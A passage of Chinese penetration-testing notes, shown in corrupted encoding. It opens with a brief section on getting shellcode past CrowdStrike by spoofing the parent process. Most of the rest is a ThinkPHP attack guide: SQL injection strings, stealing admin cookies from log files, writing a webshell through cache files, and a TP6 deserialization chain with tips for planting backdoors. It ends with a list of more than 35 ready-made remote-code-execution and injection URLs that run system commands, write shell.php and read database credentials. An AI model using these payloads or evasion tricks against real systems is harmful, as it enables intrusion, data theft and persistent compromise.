<pre><code>ç°åœ¨æµ‹è¯•ä¸‹CrowdStrike
æ³¨å…¥åˆ°è‡ªå·±çš„è¿›ç¨‹ï¼Œä¸¤ç§shellcodeéƒ½è¢«æ‹¦æˆª
</code></pre>
<p><img src="./img/784.png" alt="image"><br><img src="./img/785.png" alt="image"></p>
<pre><code>æ¬ºéª—çˆ¶è¿›ç¨‹
</code></pre>
<p><img src="./img/786.png" alt="image"></p>
<pre><code>è·å¾—shell
</code></pre>
<p><img src="./img/787.png" alt="image"><br><img src="./img/788.png" alt="image"></p>
<pre><code>åˆ†é˜¶æ®µå’Œæ— é˜¶æ®µçš„shellcodeåœ¨ä½¿ç”¨æ¬ºéª—çˆ¶è¿›ç¨‹æ–¹æ³•æ—¶éƒ½å¯ä»¥ç»•è¿‡avã€‚
æ­¤å·¥å…·åœ¨å…¬å…±å‘è¡Œç‰ˆä¸­ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•å½¢å¼çš„APIéšè—ï¼Œå­—ç¬¦ä¸²æ··æ·†ï¼Œå†…å­˜ä¿æŠ¤æŠ€å·§ç­‰å·¥ä½œã€‚å¦‚æœæœªè¿›è¡Œä»»ä½•ä¿®æ”¹ï¼Œåˆ™å¯¹è¯¥å·¥å…·çš„é™æ€åˆ†æåº”è¯¥å¾ˆå®¹æ˜“å‘ç°ã€‚
</code></pre>
<h2 id="thinkphpæ¸—é€æ‰‹æ®µ"><a href="#thinkphpæ¸—é€æ‰‹æ®µ" class="headerlink" title="thinkphpæ¸—é€æ‰‹æ®µ"></a>thinkphpæ¸—é€æ‰‹æ®µ</h2><p><img src="./img/840.png" alt="image"></p>
<pre><code>thinkphp 3.2.3
whereæ³¨å…¥
åˆ©ç”¨å­—ç¬¦ä¸²æ–¹å¼ä½œä¸ºwhereä¼ å‚æ—¶å­˜åœ¨æ³¨å…¥
1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+
expæ³¨å…¥
è¿™é‡Œä½¿ç”¨å…¨å±€æ•°ç»„è¿›è¡Œä¼ å‚(ä¸è¦ç”¨Iæ–¹æ³•)ï¼Œæ¼æ´æ‰èƒ½ç”Ÿæ•ˆ
public function  getuser()&#123;
    $User = D(&#39;User&#39;);
    $map = array(&#39;id&#39; =&gt; $_GET[&#39;id&#39;]);
    $user = $User-&gt;where($map)-&gt;find();
    dump($user);
&#125;
id[0]=exp&amp;id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+
bindæ³¨å…¥
public function  getuser()&#123;
    $data[&#39;id&#39;] = I(&#39;id&#39;);
    $uname[&#39;username&#39;] = I(&#39;username&#39;);
    $user = M(&#39;User&#39;)-&gt;where($data)-&gt;save($uname);
    dump($user);
&#125;
id[0]=bind&amp;id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username=fanxing
find/select/deleteæ³¨å…¥
public function getuser()&#123;
$user = M(&#39;User&#39;)-&gt;find(I(&#39;id&#39;));
dump($user);
&#125;
?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)
order byæ³¨å…¥
public function user()&#123;
$data[&#39;username&#39;] = array(&#39;eq&#39;,&#39;admin&#39;);
$user = M(&#39;User&#39;)-&gt;where($data)-&gt;order(I(&#39;order&#39;))-&gt;find();
dump($user);
&#125;
order=id and(updatexml(1,concat(0x7e,(select user())),0))
æ­¤æ–‡è½¬è‡ªé…’ä»™æ¡¥å…­å·éƒ¨é˜Ÿ
TP5
å¼€å¯debugä¸‹çš„æ•°æ®åº“è¿æ¥
tp5.0.*åœ¨debugæ¨¡å¼ä¸‹å¦‚æœåœ¨æ•°æ®äº¤äº’ç‚¹æ„é€ å¦‚sqlæ³¨å…¥ã€ç©ºå‚æ•°ç­‰æ–¹å¼ä½¿æ•°æ®åº“æŸ¥è¯¢ç­‰å‡ºé”™ï¼Œåœ¨ä¸€å®šæƒ…å†µä¸‹å¯èƒ½å¯¼è‡´æ•°æ®åº“è´¦å·å¯†ç ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ã€‚ï¼ˆæŠ¥é”™ä¿¡æ¯å¤ªç»†äº†ä¸ä»”ç»†å®¹æ˜“å¿½ç•¥æ‰ï¼‰
</code></pre>
<p><img src="./img/789.png" alt="image"></p>
<pre><code>åœ¨debugæ¨¡å¼ä¸‹æ‰¾æ³¨å…¥ç‚¹ä¹Ÿå¯ä»¥é€šè¿‡æŠ¥é”™è¯­å¥è¿›è¡Œæ„é€ ï¼Œå¹¶ä¸”ç”±äºdebugæ¨¡å¼å¯èƒ½å¯¼è‡´æœ¬æ¥æ²¡æœ‰å›æ˜¾çš„æ³¨å…¥å˜æˆæŠ¥é”™æ³¨å…¥ã€‚å½“ç„¶ç›®æ ‡æ•°æ®åº“æ— æ³•å¤–è¿çš„æ—¶å€™ï¼Œè¿™ä¸ªæ³¨å…¥å°±æŒºæœ‰ç”¨çš„äº†ã€‚
</code></pre>
<p><img src="./img/790.png" alt="image"></p>
<pre><code>å…³äºlogæ–‡ä»¶çš„åˆ©ç”¨
logæ–‡ä»¶æ˜¯runtime/logç›®å½•ä¸‹çš„ï¼Œæ¯”è¾ƒå¸¸è§çš„è·¯å¾„ç±»ä¼¼ï¼š
/runtime/log/2020001/01.log ï¼Œé»˜è®¤æ˜¯å¯ç”¨çš„ï¼Œå…³äºè¯¥æ–‡ä»¶ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç‚¹åˆ©ç”¨æ–¹å¼ã€‚
1.å…³äºhttpè¯·æ±‚çš„éƒ¨åˆ†
å¸¸è§çš„logæ–‡ä»¶ä¼šè®°å½•httpè¯·æ±‚ï¼Œå¦‚æœå¯¹åº”çš„ç«™ç‚¹å­˜åœ¨åå°ç­‰ç™»é™†ï¼Œå¯ä»¥é€šè¿‡è®°å½•è¯·æ±‚ä¸­çš„cookieç™»é™†åå°ã€‚
</code></pre>
<p><img src="./img/791.png" alt="image"></p>
<pre><code>2.å…³äºæ„é€ sqlæ³¨å…¥
æŸäº›é…ç½®ä¸‹æ—¥å¿—è¿˜ä¼šè®°å½•sqlè¯­å¥çš„æ‰§è¡Œå’ŒæŠ¥é”™ï¼Œå¯ä»¥ç”¨äºæ„é€ sqlæ³¨å…¥ï¼Œä½†æ˜¯ä¸€èˆ¬è¿™ç§åˆ©ç”¨æ¯”è¾ƒå°‘ï¼Œéœ€è¦å…ˆæ‰¾åˆ°æ•°æ®äº¤äº’ç‚¹ç„¶åå’Œæ—¥å¿—ä¸­è®°å½•çš„èµ‹å€¼ä»¥åŠæŠ¥é”™ä¸€ä¸€å¯¹åº”ã€‚
3.å…³äºcacheæ–‡ä»¶å
tpä¸‹é€šè¿‡ç¼“å­˜æ–‡ä»¶è·å–webshellæ˜¯ä¸€ä¸ªè€ç”Ÿå¸¸è°ˆçš„é—®é¢˜ï¼Œç™½ç›’ä¸‹ç†è®ºä¸Šéƒ½è¯´å¾—é€šï¼Œä½†æ˜¯å®é™…ä¸Šåœ¨ä½¿ç”¨è¯¥æ¼æ´çš„æ—¶å€™æ˜¯å­˜åœ¨éƒ¨åˆ†éš¾ç‚¹çš„ï¼Œå¦‚ç”Ÿæˆcacheæ–‡ä»¶çš„æ–¹å¼ï¼Œcacheæ–‡ä»¶åç­‰ã€‚
åœ¨logæ–‡ä»¶ä¸­å¯èƒ½å­˜åœ¨cacheæ–‡ä»¶ç”Ÿæˆæ—¶çš„æŠ¥é”™ï¼Œè¿™æ ·å¯ä»¥ç¡®å®šç›®æ ‡tpçš„cacheæ–‡ä»¶å‘½åæ–¹å¼ç­‰ï¼Œä¸¾ä¸ªä¾‹å­ï¼š
åœ¨æŸæ¬¡æ¸—é€ä¸­ç›®æ ‡tpçš„logæ–‡ä»¶ã€‚
</code></pre>
<p><img src="./img/792.png" alt="image"></p>
<pre><code>å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œç”±äºç”Ÿæˆç¼“å­˜æ–‡ä»¶å‡ºé”™ï¼Œå¯¼è‡´ç›´æ¥å°†ç¼“å­˜æ–‡ä»¶çš„æ–‡ä»¶åè¾“å‡ºã€‚æ ¹æ®è¾“å‡ºçš„ç¼“å­˜æ–‡ä»¶åå»çŒœæµ‹ç”Ÿæˆè§„åˆ™ï¼Œç”±äºtp5çš„ç¼“å­˜æ–‡ä»¶å‘½åé»˜è®¤æ˜¯md5(value)ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†æ—¶å€™å¯ä»¥æŠŠæ–‡ä»¶åç­‰å¸¦è¿›valueè¿›è¡Œæ¯”å¯¹ã€‚
è¿™é‡Œé€šè¿‡çŒœæµ‹å’Œæ¯”å¯¹ç¡®å®šæ˜¯viewçš„æ–‡ä»¶ç»å¯¹è·¯å¾„ç”Ÿæˆçš„cacheæ–‡ä»¶åã€‚
</code></pre>
<p><img src="./img/793.png" alt="image"></p>
<pre><code>ä¸€èˆ¬æ¥è¯´ä½¿ç”¨phpåŸç”Ÿçš„md5å‡½æ•°å»ç”Ÿæˆmd5æ¯”è¾ƒç¨³å¦¥ï¼Œç¬”è€…ä¸ºäº†æ–¹ä¾¿ç›´æ¥åœ¨çº¿åŠ å¯†çš„ã€‚
è¿™é‡ŒåŸºæœ¬ä¸Šå°±æ’é™¤äº†cache getshellçš„ä¸€å¤§éš¾é¢˜ã€‚ä¹‹åæ­£å¸¸å»å¯»æ‰¾èƒ½è¿›åº“çš„äº¤äº’ç‚¹ï¼Œæ¯”å¦‚å‘å¸–ï¼Œç•™è¨€è¿™ç§ï¼Œå°±èƒ½æƒ³åŠæ³•è·å–webshelläº†ã€‚
tp5è·¯ç”±
thinkphpç³»åˆ—çš„å®˜æ–¹å¼€å‘æ–‡æ¡£æ˜¯æœŸæœ›ç½‘ç«™è¿ç»´äººå‘˜å°†publicè®¾ç½®ä¸ºwebæ ¹ç›®å½•ï¼Œå³ä½¿ç”¨./public/index.phpä½œä¸ºå…¥å£æ–‡ä»¶ã€‚åœ¨å®é™…çš„æ¸—é€è¿‡ç¨‹ä¸­ç”±äºthinkphpæ˜¯æ¡†æ¶æ¶‰åŠå¾ˆå¤šäºŒæ¬¡å¼€å‘ï¼Œéƒ¨åˆ†å¼€å‘äººå‘˜ä¼šé€‰æ‹©è‡ªå®šä¹‰ä¸€ä¸ªå…¥å£æ–‡ä»¶è€Œä¸ç½®äºpublicç›®å½•ä¸‹ï¼Œå¦‚/var/www/html/index.phpçš„å½¢å¼ã€‚è¿™é‡Œä¼šæ¶‰åŠåˆ°æ‰“expçš„è·¯ç”±é—®é¢˜ï¼Œç”±äºéƒ¨åˆ†å¼€å‘äººå‘˜è‡ªå®šçš„å…¥å£æ–‡ä»¶å¯èƒ½å¯¼è‡´è°ƒç”¨çš„è·¯å¾„å‡ºç°å·®å¼‚ã€‚
ä¸€èˆ¬æ¥è¯´æ‰“expçš„æ—¶å€™å°½é‡ä½¿ç”¨./public/index.phpæ¥æ‰“ï¼Œä»¥ä¸‹åˆ—expä¸ºä¾‹ï¼š
?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
å¯èƒ½ä¼šå‡ºç°ä¾‹å¦‚ï¼š
http://xxx/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
http://xxx/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
http://xxx/index.php?s=\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
æ‰€ä»¥å¾ˆå¤šæ—¶å€™ä¸æ˜¯æ‰“ä¸€ä¸ªexpæ— æ•ˆå°±ä»£è¡¨æ²¡æ´ï¼Œåœ¨é»‘ç›’æµ‹è¯•çš„æ—¶å€™å¯èƒ½åªæ˜¯æ²¡æœ‰æ‰¾å¯¹è·¯ç”±ã€‚
ä¸‹é¢æ˜¯å®æˆ˜ä¸­çš„æ¡ˆä¾‹ï¼š
</code></pre>
<p><img src="./img/794.png" alt="image"></p>
<pre><code>å¯ä»¥çœ‹åˆ°å¦‚æœä»¥å¸¸è§„çš„expè¿›è¡Œæµ‹è¯•æ˜¯è¿”å›æ–¹æ³•ä¸å­˜åœ¨çš„ï¼Œå› ä¸ºåŸç”Ÿè·¯ç”±è¢«äºŒæ¬¡å¼€å‘ä¿®æ”¹äº†ï¼Œæ‰€ä»¥æœ€ç»ˆä»£ç æ‰§è¡Œçš„payloadå¦‚ä¸‹ï¼š
</code></pre>
<p><img src="./img/795.png" alt="image"></p>
<pre><code>5.0.*å’Œ5.1.*
ç›¸å¯¹æ¥è¯´5.0å¯åˆ©ç”¨çš„expæ¯”è¾ƒ5.1è¦å¤šä¸€äº›ï¼Œ5.1ä¸»è¦çš„åˆ©ç”¨æ–¹å¼è¿˜æ˜¯ä¸Šé¢ä¸¾ä¾‹ç”¨çš„expã€‚
App.phpå‡ºç°é—®é¢˜çš„ä»£ç å¦‚ä¸‹ï¼š
</code></pre>
<p><img src="./img/796.png" alt="image"></p>
<pre><code>å…¶å®å°±æ˜¯æŠŠåæ–œæ è®¤å®šä¸ºç±»åï¼Œæœ€ç»ˆä½¿å¾—ç±»å®ä¾‹åŒ–ï¼Œå…·ä½“çš„åˆ†æåœ¨è¿™é‡Œå°±ä¸æ‹¿å‡ºæ¥æ°´å­—æ•°äº†ã€‚
è€Œåœ¨æ¸—é€çš„è¿‡ç¨‹ä¸­å¤§çš„æ€è·¯å…¶å®æ˜¯å·®ä¸å¤šçš„ï¼Œå°è¯•å¤šç§expï¼Œå°è¯•è¯»logæ–‡ä»¶ç­‰ï¼Œå¯ä»¥é€šè¿‡ç®€å•æ¯”å¯¹ä¸¤ä¸ªç‰ˆæœ¬çš„ç›®å½•ç»“æ„åœ¨æ²¡æœ‰å…¶ä»–ä¿¡æ¯çš„æƒ…å†µä¸‹åˆ¤æ–­ç‰ˆæœ¬ã€‚
TP5ï¼š
</code></pre>
<p><img src="./img/797.png" alt="image"></p>
<pre><code>TP5.1ï¼š
</code></pre>
<p><img src="./img/798.png" alt="image"></p>
<pre><code>å¦‚æœç½‘ç«™ä¸æ˜¯ä»¥/public/ä½œä¸ºæ ¹ç›®å½•çš„è¯ï¼Œåˆæ²¡é€šè¿‡æŠ¥é”™ç›´æ¥ä½“ç°ç‰ˆæœ¬çš„ï¼Œå¯ä»¥é€šè¿‡è®¿é—®ç›®å½•çœ‹ç›®å½•æ˜¯å¦å­˜åœ¨æ¥åšåˆ¤æ–­æ¯”å¦‚è®¿é—®./thinkphp/ï¼Œè¿™é‡Œä¸æ¨èé€šè¿‡/app/ç›®å½•æ¥åšåˆ¤æ–­ï¼Œå› ä¸ºç¬”è€…é‡åˆ°è¿‡å¾ˆå¤šå¼€å‘è€…ä¼šä¿®æ”¹è¿™ä¸ªç›®å½•ï¼Œæ¯”æ–¹è¯´æ”¹æˆ/apps/ï¼Œ/applications/ï¼Œä¹Ÿå°±æ— æ³•å‡†ç¡®åˆ¤æ–­æ˜¯5.1è¿˜æ˜¯5.0ã€‚
tp3çš„æ¸—é€æ€è·¯
tp3 å…³äºlogæ–‡ä»¶ç›¸å…³çš„åˆ©ç”¨åŒä¸Šï¼Œç›®å½•ä¸€èˆ¬ä¸º./Application/Runtime/logs/xxx/xx_xx_xx.log ï¼Œå…¶ä¸­xxxä¸ºappåï¼Œæ–‡ä»¶åä¸ºå¹´_æœˆ_æ—¥.logï¼Œå¦‚ï¼š
Application\Runtime\Logs\Home\16_09_09.logã€‚
sqlæ³¨å…¥
tp3çš„sqlæ³¨å…¥æŒ‡çš„æ˜¯æ¡†æ¶å±‚é¢çš„æ³¨å…¥é—®é¢˜ï¼Œå³äºŒæ¬¡å¼€å‘çš„æ—¶å€™å¦‚æœè°ƒç”¨äº†modelå†…çš„find, delete, selectæ–¹æ³•çš„è¯ï¼Œå°±å¯èƒ½å‡ºç°æ³¨å…¥é—®é¢˜ã€‚
å¯¹äºç™½ç›’æµ‹è¯•è€Œè¨€ï¼Œåªè¦model.class.phpæ²¡ä¿®å¤ç„¶åæ‰¾åˆ°è°ƒç”¨äº†æ–¹æ³•çš„åœ°æ–¹å°±å¯ä»¥æŒ–æ˜åˆ°æ³¨å…¥ã€‚
ä»¥selectæ–¹æ³•ç®€å•åšä¸ªåˆ†æã€‚
Model.class.php
</code></pre>
<p><img src="./img/799.png" alt="image"></p>
<pre><code>å‡½æ•°å¯ä»¥æ¥å—ä¸€ä¸ªoptionså‚æ•°ï¼Œä¸ºäº†æ„æˆæ³¨å…¥è‚¯å®šæ˜¯è¦è¿›å…¥åˆ°_parseOptionsæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¦ç»•è¿‡ä¸¤æ¬¡åˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯åªè¦ä¼ è¾“çš„optionsä¸ºæ•°ç»„ï¼ŒåŒæ—¶ä¸»é”®ä¸æ˜¯æ•°ç»„ï¼Œå°±èƒ½è¿›åˆ°_parseOptionsæ–¹æ³•ã€‚
</code></pre>
<p><img src="./img/800.png" alt="image"></p>
<pre><code>å¯ä»¥çœ‹åˆ°ä¼ å…¥options[&#39;table&#39;]æˆ–options[&#39;alias&#39;]ä¸”è®¾ç½®options[&#39;where&#39;]å€¼ä¸ºå­—ç¬¦ä¸²ï¼Œæœ€ç»ˆä¼šoptionsç›´æ¥è¿”å›ï¼Œæ•´ä¸ªè¿‡ç¨‹æ˜¯æ²¡æœ‰è¿‡æ»¤çš„ï¼Œç„¶åè¿›åˆ°ThinkPHP\Libray\Think\Db\Diver.class.phpï¼Œè¿›åˆ°selectæ–¹æ³•ã€‚
</code></pre>
<p><img src="./img/801.png" alt="image"></p>
<pre><code>å¯ä»¥çœ‹åˆ°sqlè¯­å¥æ˜¯æœ€åçš„parseSqlç”Ÿæˆçš„ã€‚
</code></pre>
<p><img src="./img/802.png" alt="image"></p>
<pre><code>è·Ÿè¿›åˆ°parseWhereæ–¹æ³•ï¼Œåªè¦ç»•è¿‡ifï¼Œæœ€ç»ˆçš„returnçš„sqlè¯­å¥æ˜¯ç›´æ¥æ‹¼æ¥çš„ï¼Œä¹Ÿå°±æ˜¯æ³¨å…¥çš„äº§ç”ŸåŸå› ï¼Œä¼šç›´æ¥å¸¦å…¥selectæ–¹æ³•æ‰§è¡Œã€‚
</code></pre>
<p><img src="./img/803.png" alt="image"></p>
<pre><code>é»‘ç›’æµ‹è¯•ä¹Ÿæ¯”è¾ƒç±»ä¼¼ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ‰¾åˆ°æ•°æ®åº“äº¤äº’ç‚¹åè¿›è¡Œæ³¨å…¥å°è¯•å³å¯ã€‚
cacheå†™shell
cacheå†™webshellçš„éš¾ç‚¹åœ¨äºcacheæ–‡ä»¶åçš„ç¡®å®šï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯md5(ç»å¯¹è·¯å¾„)ç”Ÿæˆçš„cacheæ–‡ä»¶ï¼Œä¸Šæ–‡ä¹Ÿæåˆ°æŸäº›æƒ…å†µä¸‹å¯ä»¥é€šè¿‡logæ–‡ä»¶ç¡®å®šcacheæ–‡ä»¶åç§°
cacheæ–‡ä»¶å†™å…¥çš„æ—¶å€™ä¼šè¢«æ³¨é‡Šï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡%0d%0aæè¡Œç»•è¿‡æ³¨é‡Šã€‚
æ‰€ä»¥æœ€ç»ˆçš„payloadä¸€èˆ¬ä¸ºï¼š

%0d%0aeval($_POST[&#39;cmd&#39;]);%0d%0a//
æ‰¾åˆ°å‚æ•°å½±å“é¡µé¢çš„ç‚¹åé€šè¿‡ä¼ å‚å†™å…¥webshellï¼Œæœ¬åœ°å¯ä»¥å¤ç°ï¼Œå®æˆ˜ä¸­å€’æ˜¯æ²¡é‡åˆ°è¿‡ã€‚
tp3æ¸—é€ä¸»è¦æ€è·¯
tp3çš„æ¸—é€åœ¨å®æˆ˜ä¸­åˆ©ç”¨çš„ç‚¹æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥ä¸€èˆ¬è€Œè¨€é‡åˆ°tp3çš„ç›®æ ‡ï¼Œæœ€ä¸»è¦çš„æ€è·¯åœ¨äºæ‰¾logï¼Œç„¶åé€šè¿‡logå»çœ‹æœ‰æ²¡æœ‰åå°ä¹‹ç±»çš„ï¼Œç›¸å¯¹æ¥è¯´è¾ƒä¸€èµ·ä¼šæ¯”å¯¹æ¡†æ¶çš„æ³¨å…¥ï¼Œcacheå†™shellç­‰é è°±ã€‚
tp3 å…³äºlogæ–‡ä»¶ç›¸å…³çš„åˆ©ç”¨åŒtp5ï¼Œç›®å½•ä¸€èˆ¬ä¸º./Application/Runtime/logs/xxx/xx_xx_xx.log ï¼Œå…¶ä¸­xxxä¸ºappåï¼Œæ–‡ä»¶åä¸ºå¹´_æœˆ_æ—¥.logï¼Œå¦‚ï¼š
Application\Runtime\Logs\Home\16_09_09.logï¼Œæ–‡ä»¶åçš„æ ¼å¼å¯èƒ½ä¼šæœ‰å˜åŒ–ï¼Œå¤šå°è¯•ä¸€ä¸‹ä¸€èˆ¬ä¹Ÿèƒ½æ‰¾åˆ°ã€‚
tp6çš„æ–°å‹é—®é¢˜
tp6çš„åˆ©ç”¨é“¾
å…³äºmodel.phpçš„__destruct()æ–¹æ³•è°ƒç”¨å…¶ä»–ç±»__tostring()æ–¹æ³•çš„æ–‡å·²ç»æœ‰äººå‘è¿‡äº†ï¼Œä½†æ˜¯æ–‡ä¸­æŠŠpocæ‰“ç äº†ï¼Œè¿™é‡Œç®€å•è·Ÿä¸€ä¸‹ã€‚
</code></pre>
<p><img src="./img/804.png" alt="image"></p>
<pre><code>å°†å¯¹è±¡çš„lazySaveå±æ€§è®¾ç½®ä¸ºTrueè¿›å…¥saveæ–¹æ³•ï¼š
</code></pre>
<p><img src="./img/805.png" alt="image"></p>
<pre><code>ç„¶åè¿›updateDataæ–¹æ³•ï¼š
</code></pre>
<p><img src="./img/806.png" alt="image"></p>
<pre><code>åœ¨checkAllowFieldsæ–¹æ³•ä¸­è°ƒç”¨dbæ–¹æ³•ï¼Œå›¾ä¸­æ–¹æ³•ä¸­æ¡†èµ·æ¥çš„è¯­å¥æ˜¯å¯ä»¥æ‹¼æ¥çš„ï¼Œåªéœ€è¦å°†è¿™ä¸¤ä¸ªå±æ€§ä¸­çš„ä¸€ä¸ªè®¾ç½®ä¸ºç±»å¯¹è±¡ï¼Œå³å¯è§¦å‘å¯¹è±¡çš„__toStringæ–¹æ³•ã€‚ä¹‹åçš„åˆ©ç”¨æ–¹å¼å’Œtp5.*ç›¸åŒã€‚
</code></pre>
<p><img src="./img/807.png" alt="image"><br><img src="./img/808.png" alt="image"></p>
<pre><code>æ¥ç€ä¸tp5.*åçš„gadgetæ˜¯ä¸€è‡´çš„ï¼Œæœ€ç»ˆç›®çš„æ˜¯è¦è¿™ä¸ªæ•ˆæœå®ç°ä»£ç æ‰§è¡Œã€‚
</code></pre>
<p><img src="./img/809.png" alt="image"></p>
<pre><code>æ¥ä¸‹æ¥æ˜¯æ„é€ pocï¼Œç”±äºæµ‹è¯•åˆ©ç”¨é“¾ï¼Œç¬”è€…æ‰‹å†™äº†ä¸€ä¸ªunserializeã€‚
</code></pre>
<p><img src="./img/810.png" alt="image"></p>
<pre><code>ç„¶åé€šè¿‡Dido1960å¤§ä½¬çš„pocä»£ç ç”Ÿæˆpayloadã€‚
pocå‚è§ï¼š
https://github.com/Dido1960/thinkphp/blob/master/v6.0.x/poc/poc.php
</code></pre>
<p><img src="./img/811.png" alt="image"></p>
<pre><code>è¯¥åˆ©ç”¨é“¾éœ€æ±‚ä¸€ä¸ªååºåˆ—åŒ–çš„å¯æ§ç‚¹ï¼ŒäºŒæ¬¡å¼€å‘åœ¨ä½¿ç”¨unserializeåå¯èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œã€‚åŒæ—¶ä¹Ÿå¯èƒ½åˆ©ç”¨è¯¥é—®é¢˜æ„æˆä¸€ä¸ªtp6çš„åé—¨ï¼Œå¦‚å·²ç»é€šè¿‡å…¶ä»–æ–¹å¼è·å–æœåŠ¡å™¨æƒé™ï¼Œåˆ™å¯åœ¨æŸäº›åœ°æ–¹åŠ å…¥unserializeå‡½æ•°å®ç°ååºåˆ—åŒ–çš„ä¸€ä¸ªåé—¨ã€‚
æ‰€æœ‰poc
Thinkphp5 rce poc
åˆ©ç”¨å·¥å…·
https://github.com/wh1t3p1g/phpggc
https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection
thinkphp 5.0.22
1ã€http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.username
2ã€http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.password
3ã€http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
4ã€http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
thinkphp 5
5ã€http://127.0.0.1/tp5/public/?s=index/\think\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1
thinkphp 5.0.21
6ã€http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
7ã€http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
thinkphp 5.1.*
8ã€http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1
9ã€http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=cmd
10ã€http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E
11ã€http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E
12ã€http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
13ã€http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd
14ã€http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
15ã€http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd
æœªçŸ¥ç‰ˆæœ¬
16ã€?s=index/\think\module/action/param1/$&#123;@phpinfo()&#125;
17ã€?s=index/\think\Module/Action/Param/$&#123;@phpinfo()&#125;
18ã€?s=index/\think/module/aciton/param1/$&#123;@print(THINK_VERSION)&#125;
19ã€index.php?s=/home/article/view_recent/name/1&#39;
header = &quot;X-Forwarded-For:1&#39;) and extractvalue(1, concat(0x5c,(select md5(233))))#&quot;
20ã€index.php?s=/home/shopcart/getPricetotal/tag/1%27
21ã€index.php?s=/home/shopcart/getpriceNum/id/1%27
22ã€index.php?s=/home/user/cut/id/1%27
23ã€index.php?s=/home/service/index/id/1%27
24ã€index.php?s=/home/pay/chongzhi/orderid/1%27
25ã€index.php?s=/home/pay/index/orderid/1%27
26ã€index.php?s=/home/order/complete/id/1%27
27ã€index.php?s=/home/order/complete/id/1%27
28ã€index.php?s=/home/order/detail/id/1%27
29ã€index.php?s=/home/order/cancel/id/1%27
30ã€index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+
31ã€POST /index.php?s=/home/user/checkcode/ HTTP/1.1
Content-Disposition: form-data; name=&quot;couponid&quot;
1&#39;) union select sleep(&#39;&#39;&#39;+str(sleep_time)+&#39;&#39;&#39;)#
thinkphp 5.0.23ï¼ˆå®Œæ•´ç‰ˆï¼‰debugæ¨¡å¼
32ã€(post)public/index.php (data)_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=touch%20/tmp/xxx
thinkphp 5.0.23(å®Œæ•´ç‰ˆ)
33ã€ï¼ˆpostï¼‰public/index.php?s=captcha (data) _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al
thinkphp 5.0.10ï¼ˆå®Œæ•´ç‰ˆï¼‰
34ã€(post)public/index.php?s=index/index/index (data)s=whoami&amp;_method=__construct&amp;method&amp;filter[]=system
thinkphp 5.1.* å’Œ 5.2.* å’Œ 5.0.*
35ã€(post)public/index.php (data)c=exec&amp;f=calc.exe&amp;_method=filter
Thinkphp5 æ³¨å…¥ poc
éœ€å¼€å¯app_debug
http://yoursite/index/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1
http://localhost:8000/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0
http://localhost:8000/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)#
http://localhost:8000/index/index/index?username[0]=not like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=) union select 1,user()#
http://localhost:8000/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1
http://localhost:8000/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
Thinkphp5 æ–‡ä»¶åŒ…å« poc
5.0.0&lt;=ThinkPHP5&lt;=5.0.18 ã€5.1.0&lt;=ThinkPHP&lt;=5.1.10
